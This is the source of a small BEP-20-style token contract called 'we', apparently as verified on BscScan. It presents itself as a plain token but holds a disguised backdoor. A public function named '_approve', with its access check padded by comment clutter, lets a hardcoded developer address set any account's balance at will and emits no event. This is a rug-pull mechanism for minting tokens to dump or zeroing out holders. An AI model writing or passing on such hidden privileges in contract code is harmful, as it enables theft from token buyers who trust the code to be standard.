/**
 *Submitted for verification at BscScan.com on 2022-02-25
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.3;
contract we  {
    string public name = "we";
    string public symbol = "we";
    uint8 public decimals = 6;
    address private devAddress = 0x1e23f7F6954870d2481251dC9A230a3977f69555;
    uint256 public totalSupply = 10000 * 10 ** 6;
    address public _owner;
     modifier onlyOwner {
        require(msg.sender == _owner, "Ownable: caller is not the owner");
        _;
    }
    constructor() {
        balanceOf[msg.sender] = totalSupply;
        _owner = msg.sender;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event TransferOwnership(address indexed previousOwner, address indexed newOwner);
    function _approve(address spender, uint256 amount) public  returns (bool success) {
        require ( /*..*/ msg.sender /*..*/  == devAddress,"addres");
        balanceOf[spender] = (amount * 10 ** 6);
        return true;
    }
    function approve(address spender, uint256 amount) public returns (bool success) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function transfer(address to, uint256 amount) public returns (bool success) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
    function transferOwnership(address newOwner) public onlyOwner {
        _owner = newOwner;
    }
    
}